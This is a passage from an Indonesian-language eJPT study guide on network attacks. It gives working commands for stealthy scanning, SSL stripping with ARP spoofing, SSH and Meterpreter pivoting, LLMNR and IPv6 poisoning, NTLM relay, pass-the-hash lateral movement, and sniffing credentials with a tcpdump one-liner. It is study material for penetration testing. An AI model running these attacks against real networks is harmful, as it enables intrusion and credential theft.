# Idle/Zombie scan (gunakan host lain sebagai perantara, IP tersembunyi)
# Cari zombie host dulu
nmap -O -v ZOMBIE_HOST
# Lakukan zombie scan
nmap -sI ZOMBIE_HOST TARGET_IP

# Timing lambat (lebih sulit dideteksi IDS)
nmap -T0 TARGET_IP    # paranoid
nmap -T1 TARGET_IP    # sneaky

# Randomisasi target & port
nmap --randomize-hosts TARGET/CIDR
nmap -p $(shuf -i 1-65535 -n 1000 | tr '\n' ',') TARGET

# Spoof MAC address
nmap --spoof-mac 0 TARGET_IP         # MAC random
nmap --spoof-mac Apple TARGET_IP     # MAC vendor Apple

# Spoof source IP (tidak bisa terima response, untuk distraksi)
nmap -S SPOOFED_IP TARGET_IP -e eth0 -Pn

# ─── SCAN ALTERNATIF ────────────────────────────────────────

# Xmas scan (set FIN, PSH, URG flags)
nmap -sX TARGET_IP

# FIN scan
nmap -sF TARGET_IP

# NULL scan (tidak set flag apapun)
nmap -sN TARGET_IP

# ACK scan (mapping firewall rules)
nmap -sA TARGET_IP
# Filtered = ada firewall, Unfiltered = tidak ada firewall untuk port itu

# Window scan
nmap -sW TARGET_IP
```

### SSL Stripping

Menurunkan koneksi HTTPS ke HTTP agar bisa di-sniff.

```bash
# Dengan sslstrip (classic)
sslstrip -l 8080

# Setup iptables redirect
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080

# Lakukan ARP poisoning bersamaan
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP

# Dengan bettercap (lebih mudah)
set http.proxy.sslstrip true
http.proxy on
arp.spoof on
net.sniff on
```

---

## 8. Pivoting & Tunneling

### Konsep Pivoting

Pivoting adalah teknik menggunakan host yang sudah dikompromis sebagai **batu loncatan** untuk mengakses jaringan internal yang sebelumnya tidak bisa dijangkau langsung.

```
TANPA PIVOT:
  [Attacker] ───✗─── [Internal Network]

DENGAN PIVOT:
  [Attacker] ──→ [Compromised Host] ──→ [Internal Network]
                    (Pivot Point)
```

### 8.1 Port Forwarding

#### Local Port Forwarding

Meneruskan port lokal attacker ke port di jaringan target melalui host perantara.

```bash
# SSH Local Port Forwarding
# Syntax: ssh -L [local_port]:[remote_host]:[remote_port] [user@jumphost]
ssh -L 8080:INTERNAL_HOST:80 user@PIVOT_HOST
# Sekarang: localhost:8080 → INTERNAL_HOST:80

# Akses via browser
curl http://localhost:8080

# Contoh RDP ke internal host
ssh -L 3389:INTERNAL_WIN_HOST:3389 user@PIVOT_HOST
xfreerdp /u:admin /p:pass /v:localhost:3389

# Contoh SMB
ssh -L 445:INTERNAL_SMB_HOST:445 user@PIVOT_HOST
smbclient -L //localhost/ -U admin
```

#### Remote Port Forwarding

```bash
# SSH Remote Port Forwarding
# Syntax: ssh -R [remote_port]:[local_host]:[local_port] [user@jumphost]
ssh -R 4444:localhost:4444 user@PIVOT_HOST
# Di pivot host: port 4444 → attacker:4444
# Berguna untuk reverse shell melewati firewall
```

#### Dynamic Port Forwarding (SOCKS Proxy)

```bash
# SSH Dynamic Port Forwarding - buat SOCKS proxy
ssh -D 1080 user@PIVOT_HOST
# Sekarang port 1080 = SOCKS proxy melalui PIVOT_HOST

# Konfigurasi proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Gunakan proxychains
proxychains nmap -sT 192.168.2.0/24
proxychains curl http://INTERNAL_HOST
proxychains evil-winrm -i INTERNAL_WIN -u admin -p pass
```

---

### 8.2 SSH Tunneling

```bash
# Tunnel ke internal service
ssh -L LOCAL_PORT:TARGET_INTERNAL_IP:TARGET_PORT pivot_user@PIVOT_IP

# Contoh akses MySQL internal
ssh -L 3306:192.168.2.100:3306 user@10.10.10.5
mysql -h 127.0.0.1 -u root -p

# Contoh akses web internal
ssh -L 8080:192.168.2.200:80 user@10.10.10.5
curl http://localhost:8080

# Background SSH tunnel (-N = no command, -f = background)
ssh -N -f -L 8080:192.168.2.200:80 user@10.10.10.5

# Multi-hop tunneling (nested tunnels)
ssh -L 8080:192.168.3.100:80 user@PIVOT1 -t ssh -L 8080:192.168.3.100:80 user@PIVOT2
```

---

### 8.3 Metasploit Pivoting

#### Route via Meterpreter

```bash
# Setelah dapat sesi Meterpreter di pivot host
meterpreter> ipconfig                    # lihat jaringan yang terhubung
meterpreter> run post/multi/manage/autoroute SUBNET=192.168.2.0/24
meterpreter> background

# Verifikasi route
route print

# Scan jaringan internal melalui pivot
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
set PORTS 22,80,443,445,3389
run

# Eksploitasi target internal
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.2.100
run
```

#### SOCKS Proxy via Metasploit

```bash
# Setup SOCKS proxy
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Konfigurasi proxychains
nano /etc/proxychains4.conf
# Tambahkan: socks5 127.0.0.1 1080

# Scan melalui proxy
proxychains nmap -sT -Pn 192.168.2.0/24
```

---

### 8.4 Proxychains

```bash
# Konfigurasi /etc/proxychains4.conf
nano /etc/proxychains4.conf

# Contoh konfigurasi:
# [ProxyList]
# socks5  127.0.0.1  1080
# socks4  127.0.0.1  1080
# http    127.0.0.1  8080

# Penggunaan
proxychains nmap -sT -Pn -p 22,80,445 TARGET_INTERNAL
proxychains curl http://INTERNAL_WEB
proxychains ssh user@INTERNAL_HOST
proxychains evil-winrm -i INTERNAL_IP -u admin -p pass
proxychains smbclient //INTERNAL_IP/share -U admin

# Dynamic chain (gunakan proxy bergantian)
# Aktifkan di proxychains4.conf: dynamic_chain

# Strict chain (semua proxy harus berfungsi)
# Aktifkan: strict_chain
```

---

## 9. Network Protocol Attacks

### 9.1 NetBIOS & LLMNR Poisoning

#### Cara Kerja

**LLMNR (Link-Local Multicast Name Resolution)** dan **NetBIOS Name Service (NBT-NS)** digunakan Windows untuk resolusi nama ketika DNS gagal. Keduanya broadcast ke seluruh jaringan tanpa autentikasi.

```
NORMAL:
  1. Windows client coba resolusi "fileserver" via DNS → gagal
  2. Client broadcast LLMNR: "Ada yang tahu 'fileserver'?"
  3. Server yang sebenarnya menjawab

POISONING:
  1. Windows client broadcast LLMNR: "Ada yang tahu 'fileserver'?"
  2. Attacker dengan Responder menjawab duluan: "Saya!"
  3. Client mengirim hash NTLMv2 untuk autentikasi
  4. Attacker capture hash → crack offline
```

```bash
# Responder (lihat bagian 4.4 untuk detail)
responder -I eth0 -v

# Hash yang tertangkap
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt

# Crack hash
hashcat -m 5600 ntlmv2_hash.txt rockyou.txt
john --wordlist=rockyou.txt ntlmv2_hash.txt

# Relay attack (jika tidak bisa crack hash)
# Gunakan hash langsung untuk autentikasi tanpa cracking
use auxiliary/server/capture/smb
# atau gunakan ntlmrelayx.py dari Impacket
python3 ntlmrelayx.py -t smb://TARGET_IP -smb2support
```

---

### 9.2 IPv6 Attacks

Banyak jaringan Windows mengaktifkan IPv6 secara default meski tidak digunakan, menciptakan celah keamanan.

```bash
# Deteksi IPv6 di jaringan
nmap -6 -sn fe80::/10               # link-local range
nmap -6 TARGET_IPv6_ADDR

# mitm6 - exploiting IPv6 in Windows networks
pip3 install mitm6
mitm6 -d target.local               # target domain
mitm6 -i eth0 -d target.local

# Kombinasikan dengan ntlmrelayx (Impacket)
python3 ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakewpad.target.local -l /tmp/results
# -6 : IPv6
# -wh : WPAD hostname (Web Proxy Auto-Discovery)
# -l : output directory untuk credentials
```

---

## 10. Post-Exploitation Networking

### Network Discovery dari Host yang Dikompromis

```bash
# ─── LINUX ─────────────────────────────────────────────────

# Interface & routing
ifconfig
ip a
ip route
route -n
cat /etc/hosts
cat /etc/resolv.conf

# Koneksi aktif
netstat -tulpn
ss -tulpn
netstat -ano

# ARP table (host yang pernah komunikasi)
arp -a
ip neigh

# Scan jaringan lokal
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is UP"; done

# ─── WINDOWS ───────────────────────────────────────────────

# Konfigurasi jaringan
ipconfig /all
route print

# Koneksi aktif
netstat -ano
net use               # mapped drives
arp -a

# Domain info
net view /domain
net group "Domain Computers" /domain
nslookup TARGET

# ─── METERPRETER ───────────────────────────────────────────

meterpreter> ipconfig
meterpreter> route
meterpreter> arp
meterpreter> portfwd list
meterpreter> portfwd add -l 8080 -p 80 -r 192.168.2.100
meterpreter> run post/multi/gather/ping_sweep RHOSTS=192.168.2.0/24
meterpreter> run post/multi/manage/autoroute
```

### Lateral Movement

```bash
# Pass-the-Hash (PTH)
# Setelah dapat NTLM hash, gunakan langsung tanpa cracking

# Dengan Impacket
python3 psexec.py -hashes :NTLM_HASH administrator@TARGET_IP
python3 wmiexec.py -hashes :NTLM_HASH administrator@TARGET_IP
python3 smbexec.py -hashes :NTLM_HASH administrator@TARGET_IP

# Dengan CrackMapExec
crackmapexec smb 192.168.1.0/24 -u administrator -H NTLM_HASH
crackmapexec smb TARGET_IP -u administrator -H NTLM_HASH -x "whoami"

# Dengan Metasploit
use exploit/windows/smb/psexec
set SMBUser administrator
set SMBPass LMHASH:NTLMHASH
run
```

---

## 11. Cheat Sheet & Quick Reference

### Urutan Attack Network

```
1. DISCOVERY
   nmap -sn SUBNET/CIDR
   netdiscover -r SUBNET/CIDR

2. PORT SCAN
   nmap -sV -sC -O --top-ports 1000 TARGET_IP

3. SERVICE ENUMERATION
   enum4linux -a TARGET_IP          (SMB/Samba)
   snmpwalk -v2c -c public TARGET   (SNMP)
   smtp-user-enum -M VRFY -U users  (SMTP)
   dig axfr @ns TARGET.com          (DNS)

4. VULNERABILITY SCAN
   nmap --script vuln TARGET_IP
   nikto -h http://TARGET_IP

5. MITM (jika di jaringan yang sama)
   echo 1 > /proc/sys/net/ipv4/ip_forward
   arpspoof -i eth0 -t VICTIM GATEWAY
   arpspoof -i eth0 -t GATEWAY VICTIM
   # + wireshark untuk capture credentials

6. EXPLOITATION
   # Gunakan temuan dari langkah sebelumnya

7. PIVOTING (jika ada internal network)
   # Route via Meterpreter / SSH Tunnel / SOCKS
```

### One-Liner Commands

```bash
# Temukan host aktif cepat
nmap -sn 192.168.1.0/24 | grep "Nmap scan report" | awk '{print $5}'

# Scan port cepat semua host
nmap -T4 --open -p- 192.168.1.0/24 -oG - | grep "/open" | awk '{print $2}'

# Cek SMB signing (diperlukan untuk relay attack)
crackmapexec smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Capture semua HTTP credentials di jaringan
tcpdump -i eth0 -A -s 0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' | grep -oP '(?<=Authorization: Basic ).*' | base64 -d

# Quick SNMP check semua host
for ip in $(cat hosts.txt); do snmpwalk -v2c -c public $ip system 2>/dev/null | head -1 && echo $ip; done

# DNS zone transfer ke semua NS
for ns in $(dig ns target.com +short); do dig axfr @$ns target.com; done

# Brute force directory web
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt -t 50

# Cek default credentials SNMP
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt TARGET_IP
```

### Wordlists yang Sering Digunakan

```bash
# Password
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/fasttrack.txt
/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt

# Usernames
/usr/share/seclists/Usernames/Names/names.txt
/usr/share/wordlists/metasploit/unix_users.txt

# Web directories
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

# Subdomains
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# SNMP community strings
/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

### Tools Quick Reference

| Kategori | Tool | Kegunaan Utama |
|---|---|---|
| Discovery | `nmap` | Port scan, service detection |
| Discovery | `netdiscover` | ARP-based host discovery |
| DNS | `dnsenum` | DNS enumeration lengkap |
| DNS | `dnsrecon` | DNS recon & zone transfer |
| SNMP | `snmpwalk` | Enumerasi SNMP |
| SMTP | `smtp-user-enum` | Enumerasi user via SMTP |
| MITM | `arpspoof` | ARP poisoning sederhana |
| MITM | `ettercap` | MITM dengan fitur lengkap |
| MITM | `bettercap` | Modern MITM framework |
| MITM | `responder` | LLMNR/NBT-NS poisoning |
| Sniff | `wireshark` | GUI packet analysis |
| Sniff | `tcpdump` | CLI packet capture |
| Pivot | `proxychains` | Route traffic via proxy |
| Wi-Fi | `aircrack-ng` | WEP/WPA cracking |
| Wi-Fi | `airodump-ng` | Wireless capture |
| Password | `hashcat` | GPU hash cracking |
| Password | `hydra` | Network brute force |
| Recon | `theHarvester` | OSINT gathering |
| Exploit | `metasploit` | Exploitation framework |

### Perbedaan MITM Tools

| Tool | Kelebihan | Kekurangan |
|---|---|---|
| `arpspoof` | Simpel, ringan | Fitur terbatas |
| `ettercap` | GUI ada, plugin banyak | Lebih lama update |
| `bettercap` | Modern, scriptable | Perlu belajar sintaks |
| `responder` | Sangat efektif di Windows | Hanya tangkap hash, bukan plaintext |

---

## 📚 Referensi & Sumber Belajar

| Sumber | URL |
|---|---|
| eJPT Certification | https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester |
| HackTricks | https://book.hacktricks.xyz/ |
| Wireshark Docs | https://www.wireshark.org/docs/ |
| Nmap Reference | https://nmap.org/book/man.html |
| Bettercap Docs | https://www.bettercap.org/modules/ |
| Impacket Suite | https://github.com/fortra/impacket |
| SecLists | https://github.com/danielmiessler/SecLists |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| TCPdump Primer | https://danielmiessler.com/p/tcpdump/ |

---

*📅 Dibuat untuk studi eJPT — Network-Based Attacks*
*⚠️ Gunakan hanya di lingkungan yang telah mendapat izin*
